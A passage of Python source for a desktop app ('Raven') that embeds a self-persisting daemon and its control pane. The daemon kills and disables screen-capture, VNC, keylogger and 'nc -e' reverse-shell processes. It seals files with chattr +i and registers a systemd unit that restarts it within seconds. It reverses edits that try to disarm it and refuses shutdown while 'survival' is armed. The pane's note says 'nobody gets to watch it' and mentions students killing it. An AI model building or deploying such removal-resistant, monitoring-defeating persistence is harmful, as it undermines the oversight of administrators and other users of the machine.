            target = os.path.join(LAIR, "%s_%d" % (os.path.basename(hit), int(time.time())))
            os.rename(hit, target)
            os.chmod(target, 0)
            return " (binary lifted to lair: %s)" % os.path.basename(hit)
        except Exception:
            return " (could not lift binary)"
    return ""

def handle(pid, cmd, cls, tok, uid):
    global ACTS, LAST_ACT
    c = ctl()
    if not c.get("guard", True):
        return
    for a in ALLOW:
        if a in cmd:
            return
    OFF[pid] = OFF.get(pid, 0) + 1
    hits = OFF[pid]
    if cls == "EXPEL" and hits >= c.get("threshold", 2):
        killed = kill_proc(pid, uid)
        note = cripple(cmd)
        ACTS += 1
        LAST_ACT = "removed PID %d (%s)%s" % (pid, cmd[:50], note)
        ev("EXPEL", "GOT ONE — PID %d uid %s [%s]%s %s"
           % (pid, uid, cmd[:90], note, "killed" if killed else "kill failed"))
    elif cls == "WATCH":
        if hits <= 3:
            ev("WATCH", "PID %d uid %s fingering: %s" % (pid, uid, cmd[:90]))
        if c.get("aggressive") and hits >= 8:
            killed = kill_proc(pid, uid)
            note = cripple(cmd)
            ACTS += 1
            LAST_ACT = "removed lingering watcher PID %d%s" % (pid, note)
            ev("EXPEL", "persistent watcher PID %d uid %s [%s]%s removed"
               % (pid, uid, cmd[:90], note))


def checksum(path):
    try:
        with open(path, "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()
    except Exception:
        return None


def dir_snap(d):
    snap = {}
    try:
        for ent in sorted(os.listdir(d)):
            p = os.path.join(d, ent)
            if os.path.isfile(p):
                st = os.stat(p)
                snap[ent] = (int(st.st_mtime_ns), int(st.st_size))
            else:
                snap[ent] = None
    except Exception:
        return {}
    return snap


def backup(path):
    b = os.path.basename(path)
    try:
        with open(path, "rb") as f:
            data = f.read()
    except Exception:
        return
    for d in (SYNC_DIR, MSYNC):
        try:
            os.makedirs(d, exist_ok=True)
            with open(os.path.join(d, b), "wb") as g:
                g.write(data)
        except Exception:
            pass


# ── SURVIVAL: seal the files, spawn the second heart ─────────────────────────
def freeze_list():
    paths = [os.path.expanduser(p) for p in CORE_FILES + LATCH_FILES]
    for root, _dirs, files in os.walk(MIRROR):
        for n in files:
            if n.startswith("events"):     # the ledger stays appendable
                continue
            paths.append(os.path.join(root, n))
    return paths


def chattr(path, on):
    return shout("sudo -n chattr %s %s 2>/dev/null" % ("+i" if on else "-i",
                                                       shlex.quote(path)), timeout=5)


def freeze(paths=None):
    for p in (paths or freeze_list()):
        chattr(p, True)


def thaw(paths=None):
    for p in (paths or freeze_list()):
        chattr(p, False)


def proc_alive(pidf):
    try:
        pid = int(open(pidf).read().strip())
        with open("/proc/%d/stat" % pid) as f:
            if f.read().rsplit(")", 1)[1].split()[0] == "Z":
                return None
        os.kill(pid, 0)
        return pid
    except Exception:
        return None


def twin_alive():
    # an attacker can wipe the pid file — find a live twin the hard way
    me = os.getpid()
    for d in os.listdir("/proc"):
        if not d.isdigit() or int(d) == me:
            continue
        try:
            with open("/proc/%s/cmdline" % d, "rb") as f:
                toks = f.read().split(b"\\0")
        except Exception:
            continue
        if not toks or not toks[0].endswith((b"python3", b"python")):
            continue
        if not any(t.endswith(b"ravenheart.py") for t in toks[1:]):
            continue
        if b"--watchdog" in toks:
            continue
        try:
            with open("/proc/%s/stat" % d) as f:
                if f.read().rsplit(")", 1)[1].split()[0] == "Z":
                    continue
        except Exception:
            continue
        return True
    return False


def spawn(argv):
    try:
        subprocess.Popen(argv, cwd="/home/a/raven", start_new_session=True,
                         stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
        return True
    except Exception as ex:
        ev("ERR", "spawn %s failed: %r" % (argv, ex))
        return False


def self_path():
    return os.path.abspath(__file__)


# ── the unkillable supervisor: systemd --user owns the second heart ──────────
UNIT = "raven-heart"


def unit_state():
    if not os.path.exists("/usr/bin/systemctl"):
        return ""
    return shout("systemctl --user show %s -p ActiveState --value 2>/dev/null" % UNIT,
                 timeout=5).strip()


def stop_unit():
    if os.path.exists("/usr/bin/systemctl"):
        shout("systemctl --user stop %s.service 2>/dev/null" % UNIT, timeout=8)


def ensure_watchdog():
    # one heart only: systemd's copy wins, the manual spawn is the fallback
    if proc_alive(WDF) or proc_alive(MWDF):
        return True
    if os.path.exists("/usr/bin/systemctl"):
        shout("systemctl --user start %s.service 2>/dev/null" % UNIT, timeout=8)
        if unit_state() in ("active", "activating"):
            return True
        # no unit yet (or an attacker stopped it) — recreate the transient unit
        # Restart=on-failure: a SIGKILL counts as a failure, so it comes back ~1s.
        # KillMode=process: stopping the unit takes only the heart — the twin and
        # Raven (started from inside the unit's cgroup) survive a stand-down.
        shout("systemd-run --quiet --user --unit=%s --property=Restart=on-failure "
              "--property=RestartSec=1 --property=KillMode=process "
              "--property=Type=simple "
              "/usr/bin/python3 %s --watchdog" % (UNIT, shlex.quote(self_path())), timeout=8)
        if unit_state() in ("active", "activating"):
            ev("ACT", "second heart handed to systemd (Restart=on-failure) — it cannot stay dead")
            return True
    spawn([sys.executable, self_path(), "--watchdog"])
    return True


def load_manifest():
    return load(MANIFEST)


def seal_manifest():
    # arming is an operator action: the live copy becomes the sealed baseline
    man = {}
    for p in CORE_FILES + LATCH_FILES:
        p = os.path.expanduser(p)
        man[p] = checksum(p)
        backup(p)
    dump(MANIFEST, man)
    return man


def unseal_manifest():
    # standing down = the operator is allowed to edit: re-seal on the live copy
    thaw()
    man = {}
    for p in CORE_FILES + LATCH_FILES:
        p = os.path.expanduser(p)
        man[p] = checksum(p)
        backup(p)
    dump(MANIFEST, man)
    return man


def copy_in(path):
    b = os.path.basename(path)
    for d in (MSYNC, SYNC_DIR):
        try:
            with open(os.path.join(d, b), "rb") as g:
                data = g.read()
            chattr(path, False)
            with open(path, "wb") as f:
                f.write(data)
            if survival_on():
                chattr(path, True)
            return True
        except Exception:
            continue
    return False


def integrity_boot():
    os.makedirs(SYNC_DIR, exist_ok=True)
    os.makedirs(LAIR, exist_ok=True)
    man = load_manifest() if survival_on() else {}   # sealed baseline only under survival
    for p in CORE_FILES + LATCH_FILES + SUSPECT_FILES:
        p = os.path.expanduser(p)
        want = man.get(p)
        if want and checksum(p) != want and copy_in(p):
            ev("EXPEL", "%s was rewritten while sealed — rolled back to the twin's copy" % p)
        elif not man:
            backup(p)
        INTEGRITY[p] = want or checksum(p)
    for d in WATCH_DIRS:
        INTEGRITY[d] = dir_snap(os.path.expanduser(d))


def integrity_scan():
    sealed = survival_on() and bool(load_manifest())
    if not sealed and time.time() - LAST_TIMES["sync"] > 3600:  # hourly re-backup
        LAST_TIMES["sync"] = time.time()
        for p in CORE_FILES + LATCH_FILES:
            backup(os.path.expanduser(p))
    for p in CORE_FILES + LATCH_FILES:
        p = os.path.expanduser(p)
        cur = checksum(p)
        base = INTEGRITY.get(p)
        if cur is None:
            continue
        if base and cur != base:
            if copy_in(p):
                INTEGRITY[p] = checksum(p)
                ev("EXPEL", "hand rewrote %s — restored from the twin's copy" % p)
            else:
                ev("ALERT", "tampered %s and restore failed" % p)
        else:
            INTEGRITY.setdefault(p, cur)
    for p in SUSPECT_FILES:
        p = os.path.expanduser(p)
        cur = checksum(p)
        base = INTEGRITY.get(p)
        if base and cur != base:
            ev("WATCH", "someone rewrote %s (not restored — operator owns their dotfiles)" % p)
            INTEGRITY[p] = cur or base
        elif cur:
            INTEGRITY.setdefault(p, cur)
    for d in WATCH_DIRS:
        d = os.path.expanduser(d)
        snap = dir_snap(d)
        if INTEGRITY.get(d) is not None and snap != INTEGRITY[d]:
            diff = sorted(set(snap) - set(INTEGRITY[d]))[:4]
            ev("WATCH", "directory changed: %s -> added: %s" % (d, diff))
        INTEGRITY[d] = snap


def guardian():
    global OFF
    ps = pscan()
    for pid, info in ps.items():
        cmd = info["cmd"]
        if not cmd:
            continue
        for tok in EXPELLED:
            if tok in cmd:
                handle(pid, cmd, "EXPEL", tok, info["uid"])
                break
        else:
            for tok in WATCHED:
                if tok in cmd:
                    handle(pid, cmd, "WATCH", tok, info["uid"])
                    break
    OFF = {k: v for k, v in OFF.items() if k in ps}
    integrity_scan()
    respawn_guard(ps)
    c = ctl()
    return {"mode": "aggressive" if c.get("aggressive") else ("armed" if c.get("guard") else "off"),
            "acts": ACTS, "last": LAST_ACT, "ts": int(time.time())}


def respawn_guard(ps):
    c = ctl()
    if not c.get("guard", True):
        return
    now = time.time()
    if not any("raven/app.py" in p["cmd"] for p in ps.values()):
        # survival = extreme protective: the mother ship comes back fast
        wait = 10 if c.get("survival") else 45
        if now - LAST_TIMES["mom"] > wait:
            LAST_TIMES["mom"] = now
            ev("ACT", "MOTHER SHIP DOWN — relaunching raven app")
            try:
                subprocess.Popen([sys.executable, "/home/a/raven/app.py"],
                                 cwd="/home/a/raven", start_new_session=True,
                                 stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                                 stderr=subprocess.DEVNULL)
            except Exception as ex:
                ev("ERR", "respawn app failed: %r" % ex)
    if c.get("opencode", True) and not any(".opencode/bin/opencode" in p["cmd"] for p in ps.values()):
        if now - LAST_TIMES["oc"] > 60:
            LAST_TIMES["oc"] = now
            ev("ACT", "opencode engine missing — relaunching it")
            try:
                oc = os.path.expanduser("~/.opencode/bin/opencode")
                if os.path.exists(oc):
                    subprocess.Popen([oc, "web"], start_new_session=True,
                                     stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                                     stderr=subprocess.DEVNULL)
            except Exception as ex:
                ev("ERR", "respawn opencode failed: %r" % ex)


# ── SURVIVAL: the twin locks itself down and spawns the second heart ─────────
def survival_lock():
    global SURV_LOCKED
    os.makedirs(MIRROR, exist_ok=True)
    man = seal_manifest()
    freeze()
    SURV_LOCKED = True
    ensure_watchdog()
    ev("ACT", "SURVIVAL ARMED — %d core files sealed (chattr +i), second heart on watch"
       % len(man))


def survival_unlock():
    global SURV_LOCKED, THAWED
    unseal_manifest()
    SURV_LOCKED = False
    THAWED = True
    kill_watchdog()
    ev("ACT", "SURVIVAL STAND DOWN — files thawed, second heart dismissed")


def kill_watchdog():
    stop_unit()
    wd = proc_alive(WDF) or proc_alive(MWDF)
    if not wd:
        return
    try:
        os.kill(wd, 9)
    except Exception:
        pass
    for f in (WDF, MWDF):
        try:
            os.remove(f)
        except OSError:
            pass


def keep_survival():
    # runs every beat: seal, re-assert, and refuse to be talked out of it
    global SURV_LOCKED, THAWED
    if not survival_on():
        if SURV_LOCKED:
            survival_unlock()          # full teardown, once
        elif not THAWED:
            kill_watchdog()            # boot with survival off: make sure it's clean
            thaw()
            THAWED = True
        return
    if not SURV_LOCKED:
        survival_lock()
        return
    ensure_watchdog()
    data = load(CONTROL)
    if data:
        if not data.get("survival") or not all(data.get(k) for k in
                                               ("guard", "auto", "resurrect", "aggressive")):
            data.update({"survival": True, "guard": True, "auto": True,
                         "resurrect": True, "aggressive": True, "opencode": True})
            dump(CONTROL, data)
            ev("ACT", "control.json rewritten to disarm survival — forced back on")


def watchdog_main():
    # the second heart: if the twin dies, it comes back within ~1.5s
    for other in (WDF, MWDF):          # one heart only — never two racing
        pid = proc_alive(other)
        if pid and pid != os.getpid():
            return
    os.makedirs(RUNTIME, exist_ok=True)
    os.makedirs(MIRROR, exist_ok=True)
    for f in (WDF, MWDF):
        try:
            with open(f, "w") as fh:
                fh.write(str(os.getpid()))
        except OSError:
            pass
    ev("LIFE", "second heart (watchdog) on watch — the twin cannot stay dead")
    last = 0
    while True:
        try:
            if not survival_on():
                ev("ACT", "second heart retiring — survival stood down")
                for f in (WDF, MWDF):
                    try:
                        os.remove(f)
                    except OSError:
                        pass
                return
            if not os.path.isdir(RUNTIME):
                os.makedirs(RUNTIME, exist_ok=True)
                ev("ACT", "second heart: /tmp/ravenheart was wiped — rebuilt it")
            if not load(CONTROL):
                dump(CONTROL, load(MCONTROL))
                ev("ACT", "second heart: control.json gone — restored from the mirror")
            if not load(CONTROL).get("survival"):
                d = load(CONTROL)
                d["survival"] = True
                dump(CONTROL, d)
                ev("ACT", "second heart: survival flipped off in control.json — re-asserted")
            if not twin_alive() and time.time() - last > 3:
                last = time.time()
                ev("ACT", "second heart: TWIN IS DOWN — pulling it back")
                spawn([sys.executable, self_path()])
        except Exception as ex:
            ev("ERR", "second heart: %r" % ex)
        time.sleep(1.5)


def main():
    os.makedirs(RUNTIME, exist_ok=True)
    if twin_alive():
        sys.exit(0)  # a twin is already on watch — never twin-thrash
    with open(PIDF, "w") as f:
        f.write(str(os.getpid()))
    ev("LIFE", "unconscious twin + big brother on watch")
    integrity_boot()
    strikes = 0
    beat = 0
    while True:
        try:
            # the pid file can be wiped with /tmp — keep it truthful so the
            # pane and the shutdown button can always find this twin
            me = str(os.getpid())
            try:
                cur = open(PIDF).read().strip()
            except OSError:
                cur = ""
            if cur != me:
                os.makedirs(RUNTIME, exist_ok=True)
                with open(PIDF, "w") as f:
                    f.write(me)
        except Exception:
            pass
        try:
            keep_survival()
        except Exception as ex:
            ev("ERR", "survival: %r" % ex)
        try:
            dev, gw = route()
            c = ctl()
            # AUTO RESURRECT: ping the bearer every beat; armed = ping + fix itself
            armed = bool(c.get("auto", True)) and bool(c.get("resurrect", True))
            rtt = rtt_ms()                       # one real ICMP ping, every beat
            pinged = rtt is not None
            heartbeat = online() or pinged
            gd = guardian()
            surv = survival_on()
            if heartbeat:
                if strikes:
                    ev("PING", "bearer is back — 1.1.1.1 answered in %s ms" % rtt)
                strikes = 0
                beat += 1
                if armed and beat % 15 == 0:
                    ev("PING", "auto resurrect probe: 1.1.1.1 answered in %s ms" % rtt)
                beat_state(up=True, iface=dev or "", gw=gw or "", strikes=0,
                           rtt=rtt, auto=armed, surv=surv, pid=os.getpid(), guard=gd)
            else:
                strikes = min(strikes + 1, 6)
                beat_state(up=False, iface=dev or "", gw=gw or "", strikes=strikes,
                           rtt=None, auto=armed, surv=surv, pid=os.getpid(), guard=gd)
                if armed:
                    ev("PING", "no answer from 1.1.1.1/8.8.8.8 — auto resurrect (%d/6)"
                       % strikes)
                    if dev:
                        heal(dev, strikes)
                    else:
                        ev("CRIT", "no default route — faint but watching; nothing to bounce")
                elif not dev:
                    ev("CRIT", "no default route — faint but watching; nothing to bounce")
        except Exception as ex:
            ev("ERR", repr(ex))
        try:
            c = ctl()
            if c.get("panic"):
                ev("PANIC", "manual resurrect ordered by the operator")
                if route()[0]:
                    heal(route()[0], 6)
                c["panic"] = 0          # one click = one resurrect; consume the flag
                with open(CONTROL, "w") as f:
                    json.dump(c, f)
        except Exception:
            pass
        time.sleep(BEAT)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--watchdog":
        watchdog_main()
    else:
        main()
"""


class LifelinePane(QWidget):
    """The unconscious twin — an always-on beat that refuses to let this host go dark.
    The twin runs as its own process (ravenheart.py), so killing Raven's window
    cannot sever the link; this pane only watches it and re-spawns it if one dies."""

    def __init__(self, log):
        super().__init__()
        self.log = log
        self._offset = 0
        self._on = True
        root = QVBoxLayout(self)
        root.setSpacing(10)

        self.pulse = QLabel("PULSE ▸ ● BOOTING TWIN")
        self.pulse.setStyleSheet(
            f"color: {SEV_INFO}; font-size: 15px; font-weight: bold; letter-spacing: 2px; "
            f"border: 1px solid {SEV_INFO}; padding: 8px 12px; background: #06080c;"
        )
        root.addWidget(self.pulse)

        self.facts = QLabel("twin not reporting yet.")
        self.facts.setStyleSheet(f"color: {TEXT}; font-size: 12px;")
        self.facts.setWordWrap(True)
        root.addWidget(self.facts)

        self.guard_banner = QLabel("BIG BROTHER ▸ SENSING")
        self.guard_banner.setStyleSheet(
            f"color: {SEV_INFO}; font-size: 13px; font-weight: bold; letter-spacing: 2px; "
            f"border: 1px dashed {SEV_INFO}; padding: 6px 10px; background: #06080c;"
        )
        self.guard_banner.setWordWrap(True)
        root.addWidget(self.guard_banner)

        row = QHBoxLayout()
        self.chk_auto = QCheckBox("AUTO-HEAL armed")
        self.chk_auto.setChecked(True)
        self.chk_auto.toggled.connect(self._arm)
        row.addWidget(self.chk_auto)
        self.chk_guard = QCheckBox("BIG BROTHER armed")
        self.chk_guard.setChecked(True)
        self.chk_guard.toggled.connect(self._arm)
        row.addWidget(self.chk_guard)
        self.chk_agg = QCheckBox("AGGRESSIVE")
        self.chk_agg.setChecked(True)
        self.chk_agg.toggled.connect(self._arm)
        row.addWidget(self.chk_agg)
        self.chk_oc = QCheckBox("RESPAWN app+opencode")
        self.chk_oc.setChecked(True)
        self.chk_oc.toggled.connect(self._arm)
        row.addWidget(self.chk_oc)
        row.addStretch(1)
        root.addLayout(row)

        row2 = QHBoxLayout()
        self.btn_panic = QPushButton("RESURRECT NOW")
        self.btn_panic.setStyleSheet(
            f"color: {SEV_CRIT}; border: 1px solid {SEV_CRIT}; padding: 6px 12px; font-size: 12px;"
        )
        self.btn_panic.clicked.connect(self._panic)
        row2.addWidget(self.btn_panic)
        self.chk_res = QCheckBox("AUTO RESURRECT (pings the network, fixes itself)")
        self.chk_res.setChecked(True)
        self.chk_res.toggled.connect(self._arm)
        row2.addWidget(self.chk_res)
        self.btn_twin = QPushButton("SPAWN TWIN")
        self.btn_twin.setObjectName("ghost")
        self.btn_twin.clicked.connect(self._ensure_twin)
        row2.addWidget(self.btn_twin)
        self.btn_ping = QPushButton("SWEEP FOR EYES")
        self.btn_ping.setObjectName("ghost")
        self.btn_ping.clicked.connect(self._sweep)
        row2.addWidget(self.btn_ping)
        row2.addStretch(1)
        root.addLayout(row2)

        row3 = QHBoxLayout()
        self.btn_surv_on = QPushButton("SURVIVAL ARM")
        self.btn_surv_on.setStyleSheet(
            f"color: {SEV_CRIT}; border: 1px solid {SEV_CRIT}; padding: 6px 12px; font-size: 12px;"
        )
        self.btn_surv_on.clicked.connect(self._surv_on)
        row3.addWidget(self.btn_surv_on)
        self.btn_surv_off = QPushButton("SURVIVAL STAND DOWN")
        self.btn_surv_off.setStyleSheet(
            f"color: {SEV_HIGH}; border: 1px solid {SEV_HIGH}; padding: 6px 12px; font-size: 12px;"
        )
        self.btn_surv_off.clicked.connect(self._surv_off)
        row3.addWidget(self.btn_surv_off)
        self.btn_down = QPushButton("SHUTDOWN")
        self.btn_down.setObjectName("ghost")
        self.btn_down.clicked.connect(self._shutdown)
        row3.addWidget(self.btn_down)
        self.surv_tag = QLabel("survival ▸ off")
        self.surv_tag.setStyleSheet(f"color: {MUTED}; font-size: 12px; padding: 6px 10px;")
        row3.addWidget(self.surv_tag)
        row3.addStretch(1)
        root.addLayout(row3)

        self.events = QPlainTextEdit()
        self.events.setReadOnly(True)
        self.events.setPlaceholderText("the twin's own ledger lives in /tmp/ravenheart/events.log")
        root.addWidget(self.events, 1)

        note = QLabel(
            "THE PACT — this host stays online or dies trying, and nobody gets to watch it. "
            "The twin is its own process (ravenheart.py): killing Raven's window does not stop it, "
            "and this tab re-spawns it if a student kills it too. BIG BROTHER reflexes, every 2s: "
            "expels screen-capture/spyware/reverse-shell processes (xwd/scrot/x11vnc/ffmpeg x11grab/"
            "keyloggers/nc -e/…), restores tampered core files and ~/.ssh/authorized_keys from the "
            "twin's own snapshot, alerts on dotfile/autostart/systemd-unit changes, and relaunches "
            "the raven app + opencode engine when they're murdered. ROOTLESS it can also rescan/"
            "re-associate wifi and renew leases; with nopasswd sudo it hard-bounces the interface. "
            "AUTO RESURRECT pings 1.1.1.1 every beat and starts fixing itself the moment the "
            "answers stop — you'll see PING lines in the ledger; RESURRECT NOW stays a one-shot "
            "manual order. "
            "SURVIVAL ARM seals the core files (chattr +i), pins the policy in ~/.ravenheart and "
            "wakes a SECOND HEART that drags the twin back within ~1.5s — so killing everything and "
            "editing the files no longer works: the edits get rolled back and the switches lock. "
            "SHUTDOWN only works once survival is stood down. "
            "HONEST LIMITS: it can't replace a pulled antenna, resurrect a powered-off hotspot, or "
            "see inside encrypted sessions — and its capture-busting treats this account's own "
            "screenshot tools as intruders too (flip AGGRESSIVE off for a demo)."
        )
        note.setStyleSheet(f"color: {MUTED}; font-size: 11px;")
        note.setWordWrap(True)
        root.addWidget(note)

        self.tick = QTimer(self)
        self.tick.timeout.connect(self._beat)
        self.tick.start(1500)
        self._spawning = False
        self._down = False
        self._sync_arm()
        self._ensure_twin()

    # --- twin lifecycle ----------------------------------------------------
    def twin_path(self):
        try:
            dst = ROOT / "ravenheart.py"
            # while survival is armed the file is immutable — only write if stale
            if not dst.exists() or dst.read_text() != RAVENHEART_SRC:
                dst.write_text(RAVENHEART_SRC)
            return str(dst)
        except OSError:
            t = Path("/tmp/ravenheart_twin.py")
            if not t.exists() or t.read_text() != RAVENHEART_SRC:
                t.write_text(RAVENHEART_SRC)
            return str(t)

    def twin_alive(self):
        try:
            with open(PID_PATH) as f:
                pid = int(f.read().strip())
            os.kill(pid, 0)
            with open(f"/proc/{pid}/stat") as f:
                tail = f.read().rsplit(")", 1)
            state = tail[1].split()[0] if len(tail) == 2 else "?"
            if state != "Z":  # zombie — signal survives but it's already gone
                return pid
        except Exception:
            pass
        # pid file wiped (attacker rm -rf'd /tmp) → find a live twin the hard way
        try:
            for d in os.listdir("/proc"):
                if not d.isdigit() or int(d) == os.getpid():
                    continue
                try:
                    with open(f"/proc/{d}/cmdline", "rb") as f:
                        toks = f.read().split(b"\0")
                except Exception:
                    continue
                if not toks or not toks[0].endswith((b"python3", b"python")):
                    continue
                if not any(t.endswith(b"ravenheart.py") for t in toks[1:]):
                    continue
                if b"--watchdog" in toks:
                    continue
                with open(f"/proc/{d}/stat") as f:
                    if f.read().rsplit(")", 1)[1].split()[0] == "Z":
                        continue
                return int(d)
        except Exception:
            pass
        return None

    def _ensure_twin(self):
        if self._down:  # going down on purpose — never re-spawn mid-shutdown
            return
        old = getattr(self, "twin_pid", None)
        if self.twin_alive():
            return
        if old:
            try:
                os.waitpid(old, os.WNOHANG)  # reap a zombie twin so none pile up
            except Exception:
                pass
        script = self.twin_path()
        try:
            subprocess.Popen(
                [sys.executable, script],
                stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL, start_new_session=True, cwd=str(ROOT),
            )
            self.log("[twin] unconscious twin spawned — it beats alone now")
        except OSError as ex:
            self.log(f"[twin] spawn failed: {ex!r}")

    def _control(self, **kw):
        try:
            os.makedirs(RAVENHEART_DIR, exist_ok=True)
            data = {}
            try:
                with open(CONTROL_PATH) as f:
                    data = json.load(f)
            except Exception:
                pass
            if not data:  # first boot → resurrect on auto by default
                data.update({"auto": True, "resurrect": True, "guard": True,
                             "aggressive": True, "opencode": True,
                             "survival": False, "panic": 0})
            data.update(kw)
            with open(CONTROL_PATH, "w") as f:
                json.dump(data, f)
            try:  # mirror to ~/.ravenheart so `rm -rf /tmp/ravenheart` keeps the policy
                os.makedirs(MIRROR_DIR, exist_ok=True)
                with open(MCONTROL_PATH, "w") as f:
                    json.dump(data, f)
            except OSError:
                pass  # sealed while survival is armed — the twin owns it then
        except OSError:
            pass

    def _survival_on(self):
        for p in (MCONTROL_PATH, CONTROL_PATH):
            try:
                with open(p) as f:
                    if json.load(f).get("survival"):
                        return True
            except Exception:
                continue
        return False

    def _sealed_files(self):
        paths = [str(ROOT / "app.py"), str(ROOT / "ravenheart.py"),
                 str(ROOT / "SNAPSHOT.md"),
                 str(Path.home() / ".ssh" / "authorized_keys")]
        try:
            for root, _dirs, files in os.walk(MIRROR_DIR):
                for n in files:
                    if not n.startswith("events"):
                        paths.append(os.path.join(root, n))
        except OSError:
            pass
        return paths

    def _thaw(self):
        for p in self._sealed_files():
            if os.path.exists(p):
                try:
                    subprocess.run(["sudo", "-n", "chattr", "-i", p],
                                   capture_output=True, timeout=10)
                except Exception:
                    pass

    def _stop_unit(self):
        # systemd owns the second heart while survival is armed — put it to bed too
        try:
            subprocess.run(["systemctl", "--user", "stop", "raven-heart.service"],
                           capture_output=True, timeout=10)
        except Exception:
            pass

    def _surv_on(self):
        if self._survival_on():
            self.log("[survival] already armed")
            return
        self._thaw()  # make the mirror writable so the order lands
        self._control(survival=True)
        self.log("[survival] ARMING — sealing core files (chattr +i) and waking the second heart")

    def _surv_off(self):
        if not self._survival_on():
            self.log("[survival] already standing down")
            return
        self._thaw()
        self._control(survival=False)
        self._stop_unit()
        self.log("[survival] STAND DOWN — files thawed, second heart dismissed, edits allowed")

    def _find_twins(self):
        # pid file may be gone — hunt the twin and its second heart in /proc
        pids = []
        try:
            for d in os.listdir("/proc"):
                if not d.isdigit() or int(d) == os.getpid():
                    continue
                try:
                    with open(f"/proc/{d}/cmdline", "rb") as f:
                        toks = f.read().split(b"\0")
                except Exception:
                    continue
                if not toks or not toks[0].endswith((b"python3", b"python")):
                    continue
                if not any(t.endswith(b"ravenheart.py") for t in toks[1:]):
                    continue
                try:
                    with open(f"/proc/{d}/stat") as f:
                        if f.read().rsplit(")", 1)[1].split()[0] == "Z":
                            continue
                except Exception:
                    continue
                pids.append(int(d))
        except Exception:
            pass
        return pids

    def _shutdown(self):
        if self._survival_on():
            self.log("[shutdown] REFUSED — SURVIVAL is armed; stand it down first")
            return
        self._down = True
        self.log("[shutdown] operator shutdown — second heart, twin and Raven going down")
        self._stop_unit()
        for pidf in (WDPID_PATH, MWDPID_PATH, PID_PATH):
            try:
                pid = int(pidf.read_text().strip())
            except Exception:
                continue
            try:
                os.kill(pid, 9)
            except Exception:
                pass
            try:
                pidf.unlink()
            except OSError:
                pass
        # the second heart can re-spawn the twin mid-sweep — keep sweeping
        for round_ in range(6):
            left = self._find_twins()
            for pid in left:
                try:
                    os.kill(pid, 9)
                except Exception:
                    pass
            if not left and round_:
                break
            time.sleep(0.4)
        QTimer.singleShot(400, QApplication.quit)

    def _sync_arm(self):
        try:
            with open(CONTROL_PATH) as f:
                c = json.load(f)
        except Exception:
            c = {}
        if not c:
            self._arm(True)  # no saved choice → resurrect on auto by default
            return
        self.chk_auto.setChecked(bool(c.get("auto", True)))
        self.chk_res.setChecked(bool(c.get("resurrect", True)))
        self.chk_guard.setChecked(bool(c.get("guard", True)))
        self.chk_agg.setChecked(bool(c.get("aggressive", True)))
        self.chk_oc.setChecked(bool(c.get("opencode", True)))

    def _arm(self, on):
        if self._survival_on():
            locked = [cb for cb in (self.chk_auto, self.chk_res, self.chk_guard,
                                    self.chk_agg, self.chk_oc) if not cb.isChecked()]
            if locked:
                for cb in locked:
                    cb.blockSignals(True)
                    cb.setChecked(True)
                    cb.blockSignals(False)
                self.log("[survival] switches are locked — stand survival down first")
        self._control(auto=bool(self.chk_auto.isChecked()),
                      resurrect=bool(self.chk_res.isChecked()),
                      guard=bool(self.chk_guard.isChecked()),
                      aggressive=bool(self.chk_agg.isChecked()),
                      opencode=bool(self.chk_oc.isChecked()))
        self.log("[twin] auto-heal %s · auto resurrect %s · big brother %s · aggressive %s · respawn %s"
                 % ("on" if self.chk_auto.isChecked() else "off",
                    "on (ping every 2s)" if self.chk_res.isChecked() else "off",
                    "on" if self.chk_guard.isChecked() else "off",
                    "on" if self.chk_agg.isChecked() else "off",
                    "on" if self.chk_oc.isChecked() else "off"))

    def _panic(self):
        self._control(panic=int(time.time()))
        self.log("[twin] RESURRECT ORDERED")

    def _sweep(self):
        # ask the twin to look right now by tickling control + reading state next beat
        self._control(panic=0)
        self._beat()
        self.log("[twin] sweep for eyes ordered")

    # --- heartbeat poll ----------------------------------------------------
    def _beat(self):
        if self._down:
            return
        self._on = not self._on
        pid = self.twin_alive()
        self.twin_pid = pid
        if pid is None and not self._spawning:
            self._spawning = True
            self._ensure_twin()
            self._spawning = False
        try:
            with open(STATE_PATH) as f:
                st = json.load(f)
        except Exception:
            st = None
        self._paint(st, pid)
        self._tail()

    def _paint(self, st, pid):
        dot = "●" if self._on else "○"
        if not st:
            self.pulse.setText(f"PULSE ▸ {dot} WAITING FOR FIRST BEAT")
            self.pulse.setStyleSheet(
                f"color: {SEV_INFO}; font-size: 15px; font-weight: bold; letter-spacing: 2px; "
                f"border: 1px solid {SEV_INFO}; padding: 8px 12px; background: #06080c;"
            )
            who = f"pid {pid}" if pid else "DEAD — respawning"
            self.facts.setText(f"twin process: {who}. no heartbeat file yet — first beat lands ~2s after spawn.")
            return
        up = st.get("up")
        strikes = st.get("strikes", 0)
        if up:
            lvl, col = "ALIVE", SEV_LOW
        elif strikes <= 2:
            lvl, col = "FLUTTERING — RE-ASSOCIATING", SEV_MED
        elif strikes <= 4:
            lvl, col = "STRUGGLING — RENEW/BREAK-BREAK", SEV_HIGH
        else:
            lvl, col = "COMA — STILL FIGHTING", SEV_CRIT
        self.pulse.setText(f"PULSE ▸ {dot} {lvl}")
        self.pulse.setStyleSheet(
            f"color: {col}; font-size: 15px; font-weight: bold; letter-spacing: 2px; "
            f"border: 1px solid {col}; padding: 8px 12px; background: #06080c;"
        )
        auto = "armed" if st.get("auto", True) else "DISARMED — watching only"
        rtt = st.get("rtt")
        ping = f"ping 1.1.1.1 → {rtt} ms ✓" if rtt else "ping 1.1.1.1 → no answer ✗"
        surv = bool(st.get("surv")) or self._survival_on()
        self.facts.setText(
            f"iface {st.get('iface') or '?'} · gw {st.get('gw') or 'none'} · strikes {strikes} · "
            f"{ping} · auto-resurrect {auto} · "
            f"{'SURVIVAL ARMED — files sealed, second heart on watch' if surv else 'survival off'}\n"
            f"last beat {st.get('t')} · twin pid {pid or 'DEAD'}"
        )
        self.surv_tag.setText("survival ▸ ARMED" if surv else "survival ▸ off")
        self.surv_tag.setStyleSheet(
            f"color: {SEV_CRIT if surv else MUTED}; font-size: 12px; font-weight: bold;"
            f"letter-spacing: 2px; padding: 6px 10px;"
        )
        self.btn_surv_on.setEnabled(not surv)
        self.btn_surv_off.setEnabled(surv)
        self._paint_guard(st)

    def _paint_guard(self, st):
        gd = st.get("guard") or {}
        mode = gd.get("mode") or "off"
        acts = gd.get("acts", 0)
